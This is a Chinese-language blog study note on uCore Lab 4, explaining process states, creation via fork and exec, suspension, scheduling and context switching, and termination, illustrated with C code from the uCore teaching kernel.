              <time title="Created: 2022-04-19 18:46:54" itemprop="dateCreated datePublished" datetime="2022-04-19T18:46:54+08:00">2022-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-30 22:21:09" itemprop="dateModified" datetime="2022-04-30T22:21:09+08:00">2022-04-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><p>进程的生命周期通常有6种情况：进程创建、进程执行、进程等待、进程抢占、进程唤醒、进程结束</p>
<p>对应了一下几种进程状态：</p>
<ul>
<li>创建状态：<ul>
<li>这是一个进程刚刚建立，但还未将它送人就绪队列时的状态 </li>
<li>指的是为程序分配合适的pcb格式，然后放入内存</li>
<li>如果由于内存不足，暂未放入主存，创建工作并未完成，进程不能被调用，则被成为创建状态</li>
</ul>
</li>
<li>就绪状态：<ul>
<li>指进程得到了除CPU以外所有必要资源就等CPU开始发动了</li>
<li>通常把处于就绪状态的进程排成一个或多个队列，称其为就绪队列</li>
</ul>
</li>
<li>执行状态：<ul>
<li>指进程已获得处理机，其程序正在执行 </li>
<li>得到调度被分配到CPU，就会从就绪状态转换为执行状态，单CPU只能执行单进程，多CPU可以进行多进程</li>
</ul>
</li>
<li>阻塞状态：<ul>
<li>进程因等待某事件（如：等待I/O操作结束、等待通信信息、等待申请缓存空间）而暂停执行时的状态</li>
<li>指执行状态受到I/O的影响变为阻塞状态，等I/O完成后又变为就绪状态</li>
<li>通常将处于阻塞状态的进程排成一个队列，称为阻塞队列，在有的系统中，按阻塞原因的不同而将处于阻塞状态的进程排成多个队列</li>
</ul>
</li>
<li>唤醒状态：<ul>
<li>唤醒进程的原因：<ul>
<li>被阻塞进程需要的资源可被满足</li>
<li>被阻塞进程等待的事件到达</li>
<li>将该进程的PCB插入到就绪队列</li>
</ul>
</li>
</ul>
</li>
<li>终止状态（僵尸状态）：<ul>
<li>当一个进程已经正常结束或异常结束，OS已将它从就绪队列中移出，但尚未将它撤消时的状态（父进程尚未使用 <code>wait</code> 函数族等来收尸，即等待父进程销毁它）</li>
<li>自然或非正常结束进程，将进入终止状态，先等待os处理，然后将其pcb清零，将pcb空间返还系统</li>
</ul>
</li>
</ul>
<h2 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h2><p>在Unix中，进程通过系统调用 <code>fork</code> 和 <code>exec</code> 来创建一个进程</p>
<ul>
<li><code>fork</code>：把一个进程复制成两个除PID以外完全相同的进程<ul>
<li>fork 函数创建一个继承的子进程：<ul>
<li>该子进程复制父进程的所有变量和内存，以及父进程的所有CPU寄存器（除了某个特殊寄存器，以区分是子进程还是父进程） </li>
</ul>
</li>
<li>fork 函数一次调用，返回两个值：<ul>
<li>父进程中返回子进程的PID</li>
<li>子进程中返回 0</li>
</ul>
</li>
<li>fork 函数的开销十分昂贵，其实现开销来源于：<ul>
<li>对子进程分配内存</li>
<li>复制父进程的内存和寄存器到子进程中</li>
</ul>
</li>
<li>在大多数情况下，调用 <code>fork</code> 函数后就紧接着调用 <code>exec</code> ，此时 <code>fork</code> 中的内存复制操作是无用的，因此，<code>fork</code> 函数中使用 <strong>写时复制技术</strong>（Copy on Write， COW）</li>
</ul>
</li>
<li><code>exec</code>：用新进程来重写当前进程，PID没有改变</li>
</ul>
<p><strong>空闲进程的创建</strong></p>
<p>空闲进程主要工作是完成内核中各个子系统的初始化，并最后用于调度其他进程，该进程最终会一直在 <code>cpu_idle</code> 函数中判断当前是否可调度（循环语句）</p>
<ul>
<li>简单来说，虽然这叫做“系统空闲进程”，但这其实并不是一个真正的进程</li>
<li>由于该进程是为了调度进程而创建的，所以其 <code>need_resched</code> 成员初始时为1（需要被调度）</li>
<li>空闲进程在 <code>proc_init</code> 函数中被创建</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">proc_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    list_init(&amp;proc_list);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; HASH_LIST_SIZE; i ++) &#123;</span><br><span class="line">        list_init(hash_list + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((idleproc = alloc_proc()) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        <span class="comment">/* 分配一个物理页,作为proc_struct结构体 */</span></span><br><span class="line">        panic(<span class="string">&quot;cannot alloc idleproc.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    idleproc-&gt;pid = <span class="number">0</span>; <span class="comment">/* 将空闲进程作为第一个进程,pid为0 */</span></span><br><span class="line">    idleproc-&gt;state = PROC_RUNNABLE; <span class="comment">/* 设置该空闲进程始终可运行 */</span></span><br><span class="line">    idleproc-&gt;kstack = (<span class="keyword">uintptr_t</span>)bootstack; <span class="comment">/* 设置空闲进程的内核栈 */</span></span><br><span class="line">    idleproc-&gt;need_resched = <span class="number">1</span>; <span class="comment">/* 设置该空闲进程为可调度 */</span></span><br><span class="line">    set_proc_name(idleproc, <span class="string">&quot;idle&quot;</span>); <span class="comment">/* 设置该进程的name为&quot;idle&quot; */</span></span><br><span class="line">    nr_process ++; <span class="comment">/* 将全局线程的数目加1 */</span></span><br><span class="line"></span><br><span class="line">    current = idleproc; <span class="comment">/* 设置当前进程为idleproc */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* &lt;-------- 第一个内核进程的创建 --------&gt; */</span></span><br><span class="line">    <span class="keyword">int</span> pid = kernel_thread(init_main, <span class="string">&quot;Hello world!!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">&quot;create init_main failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    initproc = find_proc(pid);</span><br><span class="line">    set_proc_name(initproc, <span class="string">&quot;init&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assert(idleproc != <span class="literal">NULL</span> &amp;&amp; idleproc-&gt;pid == <span class="number">0</span>);</span><br><span class="line">    assert(initproc != <span class="literal">NULL</span> &amp;&amp; initproc-&gt;pid == <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>第一个内核进程的创建</strong></p>
<p>第一个内核进程是未来所有新进程的父进程或祖先进程</p>
<ul>
<li>在 <code>proc_init</code> 函数中完成创建工作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;-------- 第一个内核进程的创建 --------&gt; */</span></span><br><span class="line"><span class="keyword">int</span> pid = kernel_thread(init_main, <span class="string">&quot;Hello world!!&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123; <span class="comment">/* 内核进程创建失败 */</span></span><br><span class="line">    panic(<span class="string">&quot;create init_main failed.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">initproc = find_proc(pid); <span class="comment">/* 通过pid查找proc_struct,并赋值给initproc */</span></span><br><span class="line">set_proc_name(initproc, <span class="string">&quot;init&quot;</span>); <span class="comment">/* 设置该进程的name为&quot;init&quot; */</span></span><br><span class="line"></span><br><span class="line">assert(idleproc != <span class="literal">NULL</span> &amp;&amp; idleproc-&gt;pid == <span class="number">0</span>);</span><br><span class="line">assert(initproc != <span class="literal">NULL</span> &amp;&amp; initproc-&gt;pid == <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在<code>kernel_thread</code>中<ul>
<li>程序先设置 <code>trapframe</code> 结构，最后调用 <code>do_fork</code> 函数</li>
<li>注意：该 <code>trapframe</code> 部分寄存器 <code>ebx、edx、eip</code> 被分别设置为“目标函数地址”、“参数地址”以及“kernel_thread_entry地址”</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">init_main</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123; <span class="comment">/* 打印函数 */</span></span><br><span class="line">    cprintf(<span class="string">&quot;this initproc, pid = %d, name = \&quot;%s\&quot;\n&quot;</span>, current-&gt;pid, get_proc_name(current));</span><br><span class="line">    cprintf(<span class="string">&quot;To U: \&quot;%s\&quot;.\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)arg);</span><br><span class="line">    cprintf(<span class="string">&quot;To U: \&quot;en.., Bye, Bye. :)\&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">kernel_thread</span><span class="params">(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">uint32_t</span> clone_flags)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// fn:某个打印函数</span></span><br><span class="line">    <span class="comment">// arg:某个字符串</span></span><br><span class="line">    <span class="comment">// clone_flags:标志位</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe)); <span class="comment">/* 设置trapframe结构 */</span></span><br><span class="line">    tf.tf_cs = KERNEL_CS;</span><br><span class="line">    tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS;</span><br><span class="line">    tf.tf_regs.reg_ebx = (<span class="keyword">uint32_t</span>)fn;</span><br><span class="line">    tf.tf_regs.reg_edx = (<span class="keyword">uint32_t</span>)arg;</span><br><span class="line">    tf.tf_eip = (<span class="keyword">uint32_t</span>)kernel_thread_entry;</span><br><span class="line">    <span class="keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="number">0</span>, &amp;tf); <span class="comment">/* 调用do_fork */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>do_fork</code> 就是后续实验需要实现的函数</li>
</ul>
<h2 id="进程挂起"><a href="#进程挂起" class="headerlink" title="进程挂起"></a>进程挂起</h2><p>将处于挂起状态的进程映像在磁盘上，目的是减少进程占用的内存</p>
<p>挂起状态，它既可以是我们客户主动使得进程挂起，也可以是操作系统因为某些原因使得进程挂起，总而言之引入挂起状态的原因有以下几种：</p>
<ul>
<li>用户的请求：可能是在程序运行期间发现了可疑的问题，需要暂停进程</li>
<li>父进程的请求：考察，协调，或修改子进程</li>
<li>操作系统的需要：对运行中资源的使用情况进行检查和记账</li>
<li>负载调节的需要：有一些实时的任务非常重要，需要得到充足的内存空间，这个时候我们需</li>
<li>把非实时的任务进行挂起，优先使得实时任务执行</li>
<li>定时任务：一个进程可能会周期性的执行某个任务，那么在一次执行完毕后挂起而不是阻塞，这样可以节省内存</li>
<li>安全：系统有时可能会出现故障或者某些功能受到破坏，这是就需要将系统中正在进行的进程进行挂起，当系统故障消除以后，对进程的状态进行恢复</li>
</ul>
<p>挂起（Suspend）：把一个进程从内存转到外存 </p>
<ul>
<li>等待到等待挂起：没有进程处于就绪状态或就绪进程要求更多内存资源</li>
<li>就绪到就绪挂起：当有高优先级进程处于等待状态（系统认为很快会就绪的），低优先级就绪进程会挂起，为高优先级进程提供更大的内存空间</li>
<li>运行到就绪挂起：当有高优先级等待进程因事件出现而进入就绪挂起</li>
<li>等待挂起到就绪挂起：当有等待挂起进程因相关事件出现而转换状</li>
</ul>
<p>激活（Activate）：把一个进程从外存转到内存</p>
<ul>
<li>就绪挂起到就绪：没有就绪进程或挂起就绪进程优先级高于就绪进程</li>
<li>等待挂起到等待：当一个进程释放足够内存，并有高优先级等待挂起进程</li>
</ul>
<h2 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h2><p><strong>过程简述</strong></p>
<ul>
<li>暂停当前进程，保存上下文，并从运行状态变成其他状态</li>
<li>调度另一个进程，恢复其上下文并从就绪状态转为运行状态</li>
</ul>
<p><strong>进程控制块</strong>（Process Control Block，PCB）</p>
<ul>
<li>进程控制块是 <strong>操作系统管理控制进程运行所用的信息集合</strong> ，操作系统用PCB来描述 <strong>进程的基本情况以及运行变化的过程</strong></li>
<li><strong>PCB是进程存在的唯一标志</strong> ，每个进程都在操作系统中有一个对应的PCB（内核为每个进程维护了对应的进程控制块PCB）</li>
<li>进程控制块可以通过某个数据结构组织起来（例如链表），同一状态进程的 PCB 连接成一个链表，多个状态对应多个不同的链表，各状态的进程形成不同的链表：就绪联链表，阻塞链表等等</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> &#123;</span></span><br><span class="line">    PROC_UNINIT = <span class="number">0</span>,  <span class="comment">// 未初始化的     -- alloc_proc</span></span><br><span class="line">    PROC_SLEEPING,    <span class="comment">// 等待状态       -- try_free_pages, do_wait, do_sleep</span></span><br><span class="line">    PROC_RUNNABLE,    <span class="comment">// 就绪/运行状态  -- proc_init, wakeup_proc,</span></span><br><span class="line">    PROC_ZOMBIE,      <span class="comment">// 僵死状态       -- do_exit</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> <span class="title">state</span>;</span>      <span class="comment">// 当前进程的状态</span></span><br><span class="line">    <span class="keyword">int</span> pid;                    <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="keyword">int</span> runs;                   <span class="comment">// 当前进程被调度的次数</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> kstack;           <span class="comment">// 内核栈</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">bool</span> need_resched; <span class="comment">// 是否需要被调度</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">parent</span>;</span> <span class="comment">// 父进程ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>       <span class="comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// 保存的进程上下文,用于进程切换</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span>;</span>       <span class="comment">// 中断帧指针,指向内核栈的某个位置(保存有中断上下文)</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> cr3;                  <span class="comment">// 页目录表的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// 当前进程的相关标志</span></span><br><span class="line">    <span class="keyword">char</span> name[PROC_NAME_LEN + <span class="number">1</span>];   <span class="comment">// 进程名称(可执行文件名)</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;         <span class="comment">// 进程链表 </span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;         <span class="comment">// 进程哈希表 </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>struct context context</code>：<ul>
<li>需要注意的是，与 <code>trapframe</code> 所保存的用户态上下文不同，context 保存的是线程的 <strong>当前</strong> 上下文</li>
<li>这个上下文可能是执行用户代码时的上下文，也可能是执行内核代码时的上下文</li>
</ul>
</li>
<li><code>struct trapframe* tf</code>：<ul>
<li>无论是用户程序在用户态通过系统调用进入内核态，还是线程在内核态中被创建，内核态中的线程返回用户态所加载的上下文就是 <code>struct trapframe* tf</code></li>
<li>所以当一个线程在内核态中建立，则该新线程就必须“伪造”一个 <code>trapframe</code> 来返回用户态</li>
</ul>
</li>
<li>两者关系：<ul>
<li>以 <code>kernel_thread</code> 函数为例，尽管该函数设置了 <code>proc-&gt;trapframe</code> ，但在 <code>fork</code> 函数中的 <code>copy_thread</code> 函数里，程序还会设置 <code>proc-&gt;context</code> </li>
<li>“两个上下文”看上去好像冗余，但实际上两者所分的工是不一样的</li>
<li>进程之间通过进程调度来切换控制权，当某个 <code>fork</code> 出的新进程获取到了控制流后，首当其中执行的代码是 <code>current-&gt;context-&gt;eip</code> 所指向的代码，此时新进程仍处于内核态，但实际上我们想在用户态中执行代码，所以我们需要从内核态切换回用户态，也就是中断返回，此时会遇上两个问题：<ul>
<li>新进程如何执行中断返回？：这就是 <code>proc-&gt;context.eip = (uintptr_t)forkret</code> 的用处， <code>forkret</code> 会使新进程正确的从中断处理例程中返回</li>
<li>新进程中断返回至用户代码时的上下文为？：这就是 <code>proc_struct-&gt;tf</code> 的用处，中断返回时，新进程会恢复保存的 <code>trapframe</code> 信息至各个寄存器中，然后开始执行用户代码</li>
</ul>
</li>
</ul>
</li>
<li>由于进程数量可能较大，倘若从头向后遍历查找符合某个状态的PCB，则效率会十分低下，因此使用了哈希表作为遍历所用的数据结构</li>
</ul>
<p><strong>详细流程</strong></p>
<ul>
<li>uCore中，内核的第一个进程 <code>idleproc</code>（空闲进程）会执行 <code>cpu_idle</code> 函数，并从中调用 <code>schedule</code> 函数，准备开始调度进程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">current</span> =</span> <span class="literal">NULL</span>; <span class="comment">/* 指向当前的进程 */</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">cpu_idle</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;need_resched) &#123; <span class="comment">/* 是否需要被调度 */</span></span><br><span class="line">            schedule(); <span class="comment">/* 准备开始调度进程 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>schedule</code> 函数会先清除调度标志，并从当前进程在链表中的位置开始，遍历进程控制块，直到找出处于 <strong>就绪状态</strong> 的进程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">list_entry_t</span> proc_list; <span class="comment">/* 进程链表的起始地址 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">idleproc</span> =</span> <span class="literal">NULL</span>; <span class="comment">/* 内核的第一个进程 */</span></span><br><span class="line"><span class="comment">/* 内核的第一个进程(空闲进程):其主要工作是完成内核中各个子系统的初始化,并最后用于调度其他进程 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> le2proc(le, member)         \</span></span><br><span class="line"><span class="meta">    to_struct((le), struct proc_struct, member)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> to_struct(ptr, type, member)                               \</span></span><br><span class="line"><span class="meta">    ((type *)((char *)(ptr) - offsetof(type, member)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le, *last;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">next</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        current-&gt;need_resched = <span class="number">0</span>; <span class="comment">/* 清除调度标志 */</span></span><br><span class="line">        last = (current == idleproc) ? &amp;proc_list : &amp;(current-&gt;list_link);</span><br><span class="line">        <span class="comment">/* 第一次执行时:当前进程肯定是第一个进程(空闲进程) */</span></span><br><span class="line">        <span class="comment">/* 后续执行时:current可能是第一个进程(空闲进程),也可能不是 */</span></span><br><span class="line">        </span><br><span class="line">        le = last; <span class="comment">/* 初始化le为当前进程在链表中的位置 */</span></span><br><span class="line">        <span class="keyword">do</span> &#123; <span class="comment">/* 遍历整个进程链表,直到找出处于就绪状态的进程(准备将其调度) */</span></span><br><span class="line">            <span class="keyword">if</span> ((le = list_next(le)) != &amp;proc_list) &#123;</span><br><span class="line">                next = le2proc(le, list_link); <span class="comment">/* 根据链表信息获取该进程的物理地址 */</span></span><br><span class="line">                <span class="keyword">if</span> (next-&gt;state == PROC_RUNNABLE) &#123;</span><br><span class="line">                    <span class="comment">/* 如果是&quot;就绪/运行状态&quot;直接break,进入后续操作 */</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (le != last);</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="literal">NULL</span> || next-&gt;state != PROC_RUNNABLE) &#123;</span><br><span class="line">            next = idleproc; <span class="comment">/* 判断将要被调度的进程为空闲进程 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        next-&gt;runs ++; <span class="comment">/* 目标进程被调度的次数增加 */</span></span><br><span class="line">        <span class="keyword">if</span> (next != current) &#123; </span><br><span class="line">            <span class="comment">/* 如果调度进程不是当前进程,则运行proc_run,否则会重新进入空闲进程(循环) */</span></span><br><span class="line">            proc_run(next); <span class="comment">/* 执行进程调度操作 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>proc_run</code> 函数会设置TSS中ring0的内核栈地址，同时还会加载页目录表的地址，等到这些前置操作完成后，最后执行上下文切换</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">proc_run</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123; <span class="comment">/* 再次检查(调度进程,不能等于当前进程) */</span></span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> =</span> current, *next = proc;</span><br><span class="line">        local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            current = proc; <span class="comment">/* 设置当前执行的进程 */</span></span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE); <span class="comment">/* 设置ring0的内核栈地址 */</span></span><br><span class="line">            lcr3(next-&gt;cr3); <span class="comment">/* 加载页目录表 */</span></span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context)); <span class="comment">/* 切换上下文(汇编) */</span></span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>PS：线程控制块</strong>（Thread Control Block，TCB）</p>
<ul>
<li>线程控制块（TCB）是与进程的控制块（PCB）相似的子控制块，只是TCB中所保存的线程状态比PCB中保存少而已</li>
</ul>
<img src="/2022/04/19/Ucore-Lab4/1650201734801-1651324459312.png" class width="1650201734801"> 
<h2 id="进程终止"><a href="#进程终止" class="headerlink" title="进程终止"></a>进程终止</h2><p><strong>有序终止</strong>：进程结束时调用 <code>exit()</code>，完成进程资源回收</p>
<ul>
<li><code>exit</code> 函数调用的功能：<ul>
<li>将调用参数作为进程的“结果”</li>
<li>关闭所有打开的文件等占用资源</li>
<li>释放内存</li>
<li>释放大部分进程相关的内核数据结构</li>
<li>检查父进程是否存活<ul>
<li>如果存活，则保留结果的值，直到父进程使用，同时当前进程进入僵尸状态</li>
<li>如果没有，它将释放所有的数据结构，进程结束</li>
</ul>
</li>
<li>清理所有等待的僵尸进程（僵尸状态，终止状态）</li>
</ul>
</li>
</ul>
<h2 id="进程机制"><a href="#进程机制" class="headerlink" title="进程机制"></a>进程机制</h2><p>这里我将简述一下 ucore 的进程是什么实现的：（涉及多进程原理）</p>
<ul>
<li>内核的第一个进程 <code>idleproc</code>（空闲进程）会执行 <code>cpu_idle</code>函数，在这个函数中循环执行 <code>schedule</code> 用于空闲进程的调度，这个函数是永远不会停止的</li>
<li>其他的进程都会因为<code>schedule</code> 而被调度，又会因为各种原因被中断，然后再次调度</li>
<li>CPU 会把自己的资源依靠某种算法给分配到这些进程上，每次对于一个进程只执行一小会儿（用定时器timer实现），然后去执行其他的进程</li>
<li>从用户的视角来看，就好像这些进程是“同步运行”的一样，这就是操作系统提供的“抽象”</li>
</ul>
